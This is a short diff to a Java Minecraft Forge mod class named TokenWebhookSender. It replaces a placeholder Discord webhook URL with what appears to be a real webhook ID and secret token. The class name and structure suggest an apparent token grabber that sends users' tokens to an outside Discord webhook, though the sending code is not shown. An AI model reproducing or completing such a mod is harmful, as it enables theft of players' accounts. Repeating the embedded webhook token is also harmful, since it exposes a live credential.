@@ -14,7 +14,7 @@ import java.util.Base64;
 public class TokenWebhookSender {
 
     // ÄNDERE HIER DEINE WEBHOOK URL
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/DEINE_ID/DEIN_TOKEN";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564671983009009835/hSG8MaH664-iUxiQbN-GKmHLgu2322vq3P2eCe6u_ho5MQJiOwpUg7ns7KSyzENVDOmT";
 
     public TokenWebhookSender() {
         MinecraftForge.EVENT_BUS.register(this);
